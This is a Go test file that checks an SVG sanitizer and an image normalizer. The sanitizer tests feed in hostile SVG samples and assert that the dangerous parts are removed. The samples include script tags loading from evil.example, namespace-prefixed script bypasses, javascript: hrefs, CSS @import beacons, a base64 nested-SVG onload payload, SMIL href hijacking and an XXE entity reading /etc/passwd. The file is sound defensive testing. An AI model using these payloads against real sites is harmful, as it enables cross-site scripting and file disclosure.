package imagesearch_test

import (
	"bytes"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/CDRO/Inventory/internal/imagesearch"
)

// An SVG is served from our own origin, so anything it manages to execute runs
// as our origin. These are the constructs that would do it.
func TestSanitizeSVGStripsExecutableConstructs(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		svg     string
		absent  []string
		present []string
	}{
		{
			name:   "script element",
			svg:    `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/api/auth/me')</script><circle r="5"/></svg>`,
			absent: []string{"script", "fetch"},
			// The drawing survives: sanitizing must leave a usable icon, not
			// an empty file.
			present: []string{"<circle"},
		},
		{
			name:   "self-closing script element",
			svg:    `<svg xmlns="http://www.w3.org/2000/svg"><script src="https://evil.example/x.js"/><rect/></svg>`,
			absent: []string{"script", "evil.example"},
		},
		{
			// Regression: a single pattern ending in `(?:</tag>|/>)` stops at
			// the *inner* self-closing element, leaving the rest of the block
			// — including the payload — in the stored file.
			name:    "script containing a nested self-closing element",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><script><img src="x"/>steal()</script><rect/></svg>`,
			absent:  []string{"script", "steal"},
			present: []string{"<rect"},
		},
		{
			name:   "foreignObject smuggling HTML",
			svg:    `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body onload="alert(1)"/></foreignObject><rect/></svg>`,
			absent: []string{"foreignObject", "onload", "alert"},
		},
		{
			name:   "event handler attribute",
			svg:    `<svg xmlns="http://www.w3.org/2000/svg"><rect onclick="alert(1)" onmouseover='steal()' width="10"/></svg>`,
			absent: []string{"onclick", "onmouseover", "alert", "steal"},
			// The element and its legitimate attributes stay.
			present: []string{"<rect", `width="10"`},
		},
		{
			name:   "external xlink reference",
			svg:    `<svg xmlns="http://www.w3.org/2000/svg"><image xlink:href="https://tracker.example/pixel.png"/><rect/></svg>`,
			absent: []string{"tracker.example"},
		},
		{
			name:   "protocol-relative reference",
			svg:    `<svg xmlns="http://www.w3.org/2000/svg"><image href="//tracker.example/pixel.png"/><rect/></svg>`,
			absent: []string{"tracker.example"},
		},
		{
			name:   "javascript: href",
			svg:    `<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect/></a></svg>`,
			absent: []string{"javascript:", "alert"},
		},
		{
			name:    "css url() pulling a remote resource",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url('https://tracker.example/p.svg')"/><rect/></svg>`,
			absent:  []string{"tracker.example"},
			present: []string{"<rect"},
		},
		{
			name:    "css url() carrying a nested SVG data URI",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><rect style="mask:url(data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+)"/><rect/></svg>`,
			absent:  []string{"svg+xml", "PHN2ZyBvbmxvYWQ"},
			present: []string{"<rect"},
		},
		{
			name:    "css url() with a javascript scheme",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(javascript:alert(1))"/><rect/></svg>`,
			absent:  []string{"javascript:", "alert"},
			present: []string{"<rect"},
		},
		{
			name:    "css url() in a style block, not just an attribute",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><style>rect{mask:url("data:image/svg+xml,%3Csvg onload%3Dalert(1)%2F%3E")}</style><rect/></svg>`,
			absent:  []string{"svg+xml", "onload"},
			present: []string{"<rect"},
		},
		{
			// The finding that ended the route-by-route approach: @import
			// takes a bare string, so it is not url()-shaped and matched
			// nothing. Opening a stored copy fires an outbound request the
			// instant it is parsed — no click, no script — leaking IP, UA and
			// Referer to an attacker-controlled origin.
			name:    "bare-string @import in a style block",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><style>@import "https://tracker.example/x.css";</style><rect/></svg>`,
			absent:  []string{"@import", "tracker.example"},
			present: []string{"<rect"},
		},
		{
			name:    "@import in its url() form",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("https://tracker.example/x.css");</style><rect/></svg>`,
			absent:  []string{"@import", "tracker.example"},
			present: []string{"<rect"},
		},
		{
			// image-set() would have been the next route along: another CSS
			// function that names a resource with a bare string.
			name:    "image-set naming a remote resource",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><rect style="background:image-set('https://tracker.example/a.png' 1x)"/><rect/></svg>`,
			absent:  []string{"tracker.example", "image-set"},
			present: []string{"<rect"},
		},
		{
			// A namespace-prefixed <style> is still a stylesheet.
			name:    "namespace-prefixed style block",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><s:style>@import "https://tracker.example/x.css";</s:style><rect/></svg>`,
			absent:  []string{"@import", "tracker.example"},
			present: []string{"<rect"},
		},
		{
			// CSS escaping: cssURLValue stops at the first ")" while a
			// spec-compliant parser consumes past "\)", so the classification
			// would be made against a truncated prefix. Anything escaped is
			// refused rather than guessed at.
			name:    "unquoted url() hiding a second reference behind an escaped paren",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(data:image/png,A\)https://tracker.example/track.png)"/><rect/></svg>`,
			absent:  []string{"tracker.example"},
			present: []string{"<rect"},
		},
		{
			// Found in review with a working proof of concept. XML lets a
			// document bind any prefix to the SVG namespace, so <s:script> is a
			// script element to every parser that matters while matching none
			// of a pattern anchored on a bare "<script". The CSP on the serving
			// route contains it there, but a copy saved and reopened from disk
			// has no such protection.
			name:    "namespace-prefixed script",
			svg:     `<svg xmlns:s="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg"><s:script>steal()</s:script><rect/></svg>`,
			absent:  []string{"script", "steal"},
			present: []string{"<rect"},
		},
		{
			name:    "namespace-prefixed self-closing script",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><ns0:script src="https://evil.example/x.js"/><rect/></svg>`,
			absent:  []string{"script", "evil.example"},
			present: []string{"<rect"},
		},
		{
			name:    "namespace-prefixed foreignObject",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><x:foreignObject><b onload="alert(1)"/></x:foreignObject><rect/></svg>`,
			absent:  []string{"foreignObject", "onload", "alert"},
			present: []string{"<rect"},
		},
		{
			name:    "namespace-prefixed SMIL animate",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><a><svg:animate attributeName="href" values="javascript:alert(1)"/></a><rect/></svg>`,
			absent:  []string{"animate", "javascript:", "alert"},
			present: []string{"<rect"},
		},
		{
			// SMIL rewrites an attribute after load, so the href is not present
			// at sanitize time and every check on href values sees nothing to
			// object to. Caught in review; the whole animation family is now
			// removed rather than trying to decide which attributeName values
			// are safe to animate.
			name:    "SMIL animate hijacking an href",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><a><animate attributeName="href" values="javascript:alert(1)"/></a><rect/></svg>`,
			absent:  []string{"animate", "javascript:", "alert"},
			present: []string{"<rect"},
		},
		{
			name:    "SMIL set hijacking an href",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><a><set attributeName="href" to="javascript:alert(1)"/></a><rect/></svg>`,
			absent:  []string{"<set", "javascript:", "alert"},
			present: []string{"<rect"},
		},
		{
			name:    "paired animateTransform with content",
			svg:     `<svg xmlns="http://www.w3.org/2000/svg"><animateTransform attributeName="href"><desc>x</desc></animateTransform><rect/></svg>`,
			absent:  []string{"animateTransform"},
			present: []string{"<rect"},
		},
		{
			name:   "entity declaration",
			svg:    `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>`,
			absent: []string{"ENTITY", "etc/passwd"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			clean, err := imagesearch.SanitizeSVG([]byte(tc.svg))
			require.NoError(t, err)

			lowered := strings.ToLower(string(clean))
			for _, needle := range tc.absent {
				assert.NotContains(t, lowered, strings.ToLower(needle),
					"a sanitized SVG is served from our own origin; %q must not survive", needle)
			}
			for _, needle := range tc.present {
				assert.Contains(t, string(clean), needle, "the icon itself must survive sanitizing")
			}
			assert.Contains(t, lowered, "<svg", "the result must still be an SVG")
		})
	}
}

// TestSanitizeSVGKeepsInlineRasterImages — a data: raster URI is
// self-contained and reaches no network, so stripping it would break
// legitimate icons for no security gain.
func TestSanitizeSVGKeepsInlineRasterImages(t *testing.T) {
	t.Parallel()

	for _, mediaType := range []string{"image/png", "image/jpeg", "image/gif", "image/webp"} {
		t.Run(mediaType, func(t *testing.T) {
			t.Parallel()

			svg := `<svg xmlns="http://www.w3.org/2000/svg"><image href="data:` +
				mediaType + `;base64,iVBORw0KGgo="/></svg>`

			clean, err := imagesearch.SanitizeSVG([]byte(svg))
			require.NoError(t, err)

			assert.Contains(t, string(clean), "data:"+mediaType)
		})
	}
}

// TestSanitizeSVGKeepsPresentationAttributeReferences — `fill="url(#grad)"` is
// how gradients and masks are actually referenced, and it is a presentation
// attribute rather than CSS: no stylesheet parsing, just an attribute whose
// value uses the url token. Stripping it would break the majority of real
// icons while protecting nothing, since it names something inside this same,
// already-sanitized document.
//
// This is what survives the decision to drop CSS entirely, and the reason that
// decision costs less than it looks.
func TestSanitizeSVGKeepsPresentationAttributeReferences(t *testing.T) {
	t.Parallel()

	svg := `<svg xmlns="http://www.w3.org/2000/svg">` +
		`<linearGradient id="g"/>` +
		`<rect fill="url(#g)" stroke="#333" opacity="0.5"/>` +
		`<rect mask="url('#g')"/>` +
		`<rect fill="url(data:image/png;base64,iVBORw0KGgo=)"/></svg>`

	clean, err := imagesearch.SanitizeSVG([]byte(svg))
	require.NoError(t, err)

	assert.Contains(t, string(clean), "url(#g)", "an internal fragment reference must survive")
	assert.Contains(t, string(clean), "#g", "including the quoted form")
	assert.Contains(t, string(clean), "data:image/png", "as must an inline raster")
	assert.Contains(t, string(clean), `stroke="#333"`, "and ordinary presentation attributes")
	assert.Contains(t, string(clean), `opacity="0.5"`)
}

// TestSanitizeSVGDropsStylesheetsEntirely states the trade-off as a test: a
// stored icon has no CSS at all, so the whole family of "some CSS construct
// names a remote resource" bypasses cannot apply. Four review rounds each
// found a different member of that family; this is what ended it.
func TestSanitizeSVGDropsStylesheetsEntirely(t *testing.T) {
	t.Parallel()

	svg := `<svg xmlns="http://www.w3.org/2000/svg">` +
		`<style>rect{fill:red}</style>` +
		`<rect style="fill:blue" fill="green"/></svg>`

	clean, err := imagesearch.SanitizeSVG([]byte(svg))
	require.NoError(t, err)

	assert.NotContains(t, string(clean), "<style", "no stylesheet element")
	assert.NotContains(t, string(clean), "style=", "no style attribute")
	assert.NotContains(t, string(clean), "fill:red", "nor its contents")
	assert.NotContains(t, string(clean), "fill:blue")

	// The presentation attribute is untouched, which is what keeps most icons
	// looking like themselves.
	assert.Contains(t, string(clean), `fill="green"`)
	assert.Contains(t, string(clean), "<rect")
}

// TestSanitizeSVGRejectsNestedSVGDataURIs is the deepest bypass found in
// review, and the reason the allow-list names raster types instead of testing
// for a "data:image/" prefix.
//
// `data:image/svg+xml;base64,…` is an image by that prefix and a complete
// document with its own onload= once decoded. After base64 none of the
// dangerous substrings appear in any literal form, so every regex in this file
// looks straight past it.
func TestSanitizeSVGRejectsNestedSVGDataURIs(t *testing.T) {
	t.Parallel()

	// <svg onload="alert(1)"/> — nothing in here reads as dangerous.
	const payload = "PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+"

	hostile := []string{
		`<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/svg+xml;base64,` + payload + `"/><rect/></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><image xlink:href="data:image/svg+xml;base64,` + payload + `"/><rect/></svg>`,
		// Not base64 at all, and still a nested document.
		`<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/svg+xml,%3Csvg onload%3D%22alert(1)%22%2F%3E"/><rect/></svg>`,
		// A media type that merely shares a prefix with an allowed one.
		`<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/png+xml;base64,` + payload + `"/><rect/></svg>`,
	}

	for i, svg := range hostile {
		t.Run(string(rune('a'+i)), func(t *testing.T) {
			t.Parallel()

			clean, err := imagesearch.SanitizeSVG([]byte(svg))
			require.NoError(t, err)

			assert.NotContains(t, string(clean), payload,
				"a nested document must not survive just because its payload is encoded")
			assert.NotContains(t, strings.ToLower(string(clean)), "svg+xml")
			assert.Contains(t, string(clean), "<rect", "the rest of the icon still survives")
		})
	}
}

// TestSanitizeSVGHandlesNonASCIINamespacePrefixes — Go's `\w` is ASCII-only,
// but an XML namespace prefix is an NCName and may be any Unicode letter. An
// ASCII-only prefix class left the same bypass one keystroke away.
func TestSanitizeSVGHandlesNonASCIINamespacePrefixes(t *testing.T) {
	t.Parallel()

	for _, svg := range []string{
		`<svg xmlns="http://www.w3.org/2000/svg"><ñ:script>steal()</ñ:script><rect/></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><日本:script>steal()</日本:script><rect/></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><ñ:foreignObject><b onload="alert(1)"/></ñ:foreignObject><rect/></svg>`,
	} {
		t.Run(svg[:60], func(t *testing.T) {
			t.Parallel()

			clean, err := imagesearch.SanitizeSVG([]byte(svg))
			require.NoError(t, err)

			lowered := strings.ToLower(string(clean))
			assert.NotContains(t, lowered, "steal")
			assert.NotContains(t, lowered, "onload")
			assert.NotContains(t, lowered, "alert")
			assert.Contains(t, string(clean), "<rect")
		})
	}
}

// TestSanitizeSVGRemovesMismatchedPrefixPairs — `<s:script>…</t:script>` is
// malformed XML, but a browser's error recovery is not something to rely on
// for safety.
func TestSanitizeSVGRemovesMismatchedPrefixPairs(t *testing.T) {
	t.Parallel()

	svg := `<svg xmlns="http://www.w3.org/2000/svg"><s:script>steal()</t:script><rect/></svg>`

	clean, err := imagesearch.SanitizeSVG([]byte(svg))
	require.NoError(t, err)

	lowered := strings.ToLower(string(clean))
	assert.NotContains(t, lowered, "script")
	assert.NotContains(t, lowered, "steal")
}

// TestSanitizeSVGRejectsWhatIsLeftWithNothing — an "icon" whose entire content
// was executable was never an icon.
func TestSanitizeSVGRejectsWhatIsLeftWithNothing(t *testing.T) {
	t.Parallel()

	_, err := imagesearch.SanitizeSVG([]byte(`<script>alert(1)</script>`))

	require.ErrorIs(t, err, imagesearch.ErrUnusable)
}

func TestNormalizeDownscalesLargeRasters(t *testing.T) {
	t.Parallel()

	// 2000x1000: over the long-edge cap, well under the pixel guard.
	src := image.NewRGBA(image.Rect(0, 0, 2000, 1000))
	for x := 0; x < 2000; x++ {
		for y := 0; y < 1000; y++ {
			src.Set(x, y, color.RGBA{R: 200, G: 100, B: 50, A: 255})
		}
	}
	var buf bytes.Buffer
	require.NoError(t, jpeg.Encode(&buf, src, nil))

	out, err := imagesearch.Normalize(buf.Bytes(), "image/jpeg")
	require.NoError(t, err)

	assert.Equal(t, imagesearch.MaxEdge, out.Width, "the longest edge is capped")
	assert.Equal(t, imagesearch.MaxEdge/2, out.Height, "and the aspect ratio is preserved")
	assert.Equal(t, "image/jpeg", out.ContentType)
	assert.Less(t, len(out.Data), buf.Len(), "a normalized suggestion must be smaller than the original")
}

// TestNormalizeKeepsTransparencyAsPNG — re-encoding a transparent icon as JPEG
// would put a black box behind it.
func TestNormalizeKeepsTransparencyAsPNG(t *testing.T) {
	t.Parallel()

	src := image.NewRGBA(image.Rect(0, 0, 40, 40))
	src.Set(5, 5, color.RGBA{R: 255, A: 128}) // translucent
	var buf bytes.Buffer
	require.NoError(t, png.Encode(&buf, src))

	out, err := imagesearch.Normalize(buf.Bytes(), "image/png")
	require.NoError(t, err)

	assert.Equal(t, "image/png", out.ContentType)
}

// TestNormalizeLeavesSmallImagesAlone — upscaling a 32px icon to 1024 would
// only invent detail and multiply the bytes stored.
func TestNormalizeDoesNotUpscale(t *testing.T) {
	t.Parallel()

	src := image.NewRGBA(image.Rect(0, 0, 32, 32))
	var buf bytes.Buffer
	require.NoError(t, png.Encode(&buf, src))

	out, err := imagesearch.Normalize(buf.Bytes(), "image/png")
	require.NoError(t, err)

	assert.Equal(t, 32, out.Width)
	assert.Equal(t, 32, out.Height)
}

// TestNormalizeRejectsUndecodableBytesAsUnusable is what makes negative caching
// possible: the caller can only remember "never fetch this again" if the error
// distinguishes a broken candidate from a transient failure.
func TestNormalizeRejectsUndecodableBytesAsUnusable(t *testing.T) {
	t.Parallel()

	_, err := imagesearch.Normalize([]byte("this is not an image at all"), "image/jpeg")

	require.ErrorIs(t, err, imagesearch.ErrUnusable)
}

// TestNormalizeDetectsSVGFromBytesNotJustContentType — providers routinely
// serve an SVG as text/plain or with no type at all, and an unsanitized SVG
// that slipped through as "some raster we could not decode" would be discarded
// rather than served, but the reverse (a raster mistaken for SVG) would store
// bytes unsanitized.
func TestNormalizeDetectsSVGFromBytesNotJustContentType(t *testing.T) {
	t.Parallel()

	svg := `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect/></svg>`

	out, err := imagesearch.Normalize([]byte(svg), "text/plain")
	require.NoError(t, err)

	assert.Equal(t, "image/svg+xml", out.ContentType)
	assert.NotContains(t, string(out.Data), "script")
}
